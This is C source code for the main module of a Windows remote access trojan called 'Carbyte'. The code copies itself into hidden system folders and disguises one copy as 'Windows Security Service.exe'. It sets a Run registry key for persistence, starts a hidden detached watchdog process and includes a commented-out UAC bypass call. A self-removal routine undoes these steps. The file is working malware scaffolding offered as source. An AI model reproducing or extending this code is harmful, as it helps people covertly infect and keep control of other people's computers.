#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <conio.h>

#include "utils.h"
#include "payload.h"
#include "watchdog.h"
#include "uac_bypass.h"

#define PERSISTANCE_REG_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

char serviceName[] = "Carbyte";

void infect();
void implode();

int main(int argc, char * argv[]){
    if(argc == 1){ infect(); } else
    if(strcmp(argv[1], "-watchdog") == 0){ watchdog(argv); } else 
    if(strcmp(argv[1], "-starter") == 0){ starter(argv); } else 
    if(strcmp(argv[1], "-watchdogStarter") == 0){ watchdogStarter(argv); } else 
    if(strcmp(argv[1], "-payload") == 0){ payload(); } else
    if(strcmp(argv[1], "-implode") == 0){ implode(); }

    // MessageBoxA(NULL, "Exiting", "Service", MB_OK | MB_ICONINFORMATION);

    return 0;
}

// Infect the system
void infect(){
    // Get the path of the current executable
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    
    /* Try to aquire elevated privileges */
    // if(!IsElevated()){
    //     MessageBoxA(NULL, "Not elevated", "Error", MB_ICONINFORMATION | MB_OK | MB_TOPMOST);
    //     if(!BypassUAC(path)){
    //         printf("Failed to elevate privileges, continue\n");
    //     } else {
    //         printf("Elevation successfull\n");
    //         exit(0);
    //     }
    // } else {
    //     MessageBoxA(NULL, "Elevated", "Error", MB_ICONINFORMATION | MB_OK | MB_TOPMOST);
    // }


    /* Copy all the executables */

    // Get the destination path
    char destination[MAX_PATH];
    GetDestination(destination);


    // Copy the executable into the destination
    char executableDestination[MAX_PATH];
    strcpy(executableDestination, destination);
    strcat(executableDestination, serviceName);    // Add the directory
    strcat(executableDestination, "\\");
    CreateDirectoryA(executableDestination, NULL); // Create the directory
    SetFileAttributesA(executableDestination, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); // Set the attributes to hidden & system
    strcat(executableDestination, serviceName);    // Add the service name
    strcat(executableDestination, ".exe");         // Add the extension

    int status = CopyFileA(path, executableDestination, FALSE);
    if(status == 0){
        printf("Error copying file: %d\n", GetLastError());
        return;
    }


    // Copy the executable into the watchdog destination
    char watchdogDestination[MAX_PATH];
    strcpy(watchdogDestination, destination);
    strcat(watchdogDestination, "AMS\\");                              // Add the directory
    CreateDirectoryA(watchdogDestination, NULL);                       // Create the directory
    SetFileAttributesA(watchdogDestination, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); // Set the attributes to hidden & system
    strcat(watchdogDestination, "Windows Security Service.exe"); // Add the service name

    status = CopyFileA(path, watchdogDestination, FALSE);
    if(status == 0){
        printf("Error copying file: %d\n", GetLastError());
        return;
    }


    /* Create persistance */

    // Get the registry key
    HKEY hKey;
    if(IsElevated()){
        // hKey = HKEY_LOCAL_MACHINE;
        hKey = HKEY_CURRENT_USER;
    } else {
        hKey = HKEY_CURRENT_USER;
    }

    printf("opening registry key\n");
    // Create or open the registry key
    LONG regStatus = RegCreateKeyExA(hKey, PERSISTANCE_REG_PATH, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (regStatus != ERROR_SUCCESS) {
        printf("Failed to create/open registry key. Error: %ld\n", regStatus);
        return;
    }

    printf("setting values\n");
    // Set the default value to the watchdog path
    regStatus = RegSetValueExA(hKey, "Windows Security Service", 0, REG_SZ, (const BYTE*)watchdogDestination, (DWORD)(strlen(watchdogDestination) + 1));
    if (regStatus != ERROR_SUCCESS) {
        printf("Failed to set default value. Error: %ld\n", regStatus);
        RegCloseKey(hKey);
        return;
    }

    printf("setting DelegateExecute\n");
    // Add the "DelegateExecute" value (empty)
    regStatus = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
    if (regStatus != ERROR_SUCCESS) {
        printf("Failed to set DelegateExecute value. Error: %ld\n", regStatus);
        RegCloseKey(hKey);
        return;
    }

    RegCloseKey(hKey); // Close the registry key


    // Start the watchdog process
    printf("%s\n", watchdogDestination);
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    // Initialize STARTUPINFO and PROCESS_INFORMATION structs
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    char commandLine[128];
    strcpy(commandLine, "\"");
    strcat(commandLine, watchdogDestination);
    strcat(commandLine, "\" -watchdogStarter");
    // Create the process with no inherited handles, custom environment, and no working directory inheritance
    if (CreateProcessA(
            NULL,           // Path to executable
            commandLine,            // Command line arguments
            NULL,                          // Process security attributes
            NULL,                          // Thread security attributes
            FALSE,                         // Don't inherit handles
            DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW, // Start in a new console (optional)
            NULL,                          // No custom environment
            NULL,                          // Don't inherit current directory
            &si,                           // Startup information
            &pi)                           // Process information
    ) {
        printf("Process created successfully.\n");
        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("CreateProcess failed. Error: %lu\n", GetLastError());
    }
}

// Remove the RAT
void implode(){
    /* Stop the processes */
    if(findFirstProc("Windows Security Service.exe") != 0){
        printf("Stopping watchdog\n");
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, findFirstProc("Windows Security Service.exe"));
        if(hProcess != NULL){
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
            printf("Watchdog stopped\n");
        } else {
            printf("Failed to stop watchdog\n");
        }
    }
    char processName[sizeof(serviceName) + 4];
    strcpy(processName, serviceName);
    strcat(processName, ".exe");
    if(findFirstProc(processName) != 0){
        printf("Stopping payload\n");
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, findFirstProc(serviceName));
        if(hProcess != NULL){
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
            printf("Payload stopped\n");
        } else {
            printf("Failed to stop payload\n");
            // Forcefully kill the process
            char pid[16];
            itoa(findFirstProc(processName), pid, 10);
            char command[64];
            strcpy(command, "taskkill /PID ");
            strcat(command, pid);
            strcat(command, " /F");
            system(command);
        }
    }


    /* Remove persistance */

    // Get the registry key
    HKEY hKey;
    if(IsElevated()){
        // hKey = HKEY_LOCAL_MACHINE;
        hKey = HKEY_CURRENT_USER;
    } else {
        hKey = HKEY_CURRENT_USER;
    }

    // Delete the registry key
    printf("Cleaning registry..\n");
    LONG regStatus = RegDeleteKeyA(hKey, PERSISTANCE_REG_PATH);
    if (regStatus != ERROR_SUCCESS) {
        printf("Failed to clean up registry. Error: %ld\n", regStatus);
    } else {
        printf("Registry cleaned up successfully.\n");
    }

    RegCloseKey(hKey); // Close the registry key


    /* Remove the executables */

    // Get the destination path
    char destination[MAX_PATH];
    GetDestination(destination);

    char executablePath[MAX_PATH];
    strcpy(executablePath, destination);
    strcat(executablePath, serviceName);    // Add the directory

    char executableDestination[MAX_PATH];
    strcpy(executableDestination, executablePath);
    strcat(executableDestination, "\\");
    strcat(executableDestination, serviceName);    // Add the service name
    strcat(executableDestination, ".exe");         // Add the extension

    int status = DeleteFileA(executableDestination); // Delete the executable
    if(status == 0){
        printf("Error deleting payload: %d\n", GetLastError());
    } else {
        printf("Payload deleted\n");
    }

    status = SetFileAttributesA(executablePath, FILE_ATTRIBUTE_NORMAL); // Set the attributes to normal
    if(status == 0){
        printf("Error setting attributes: %d\n", GetLastError());
    }
    status = RemoveDirectoryA(executablePath); // Remove the directory
    if(status == 0){
        printf("Error removing payload directory: %d\n", GetLastError());
    } else {
        printf("Payload directory removed\n");
    }

    char watchdogPath[MAX_PATH];
    strcpy(watchdogPath, destination);
    strcat(watchdogPath, "AMS\\");          // Add the directory

    char watchdogDestination[MAX_PATH];
    strcpy(watchdogDestination, watchdogPath);
    strcat(watchdogDestination, "Windows Security Service.exe"); // Add the service name

    status = DeleteFileA(watchdogDestination); // Delete the executable
    if(status == 0){
        printf("Error deleting watchdog: %d\n", GetLastError());
    } else {
        printf("Watchdog deleted\n");
    }

    status = SetFileAttributesA(watchdogPath, FILE_ATTRIBUTE_NORMAL); // Set the attributes to normal
    if(status == 0){
        printf("Error setting attributes: %d\n", GetLastError());
    }
    status = RemoveDirectoryA(watchdogPath);   // Remove the directory
    if(status == 0){
        printf("Error removing watchdog directory: %d\n", GetLastError());
    } else {
        printf("Watchdog directory removed\n");
    }
}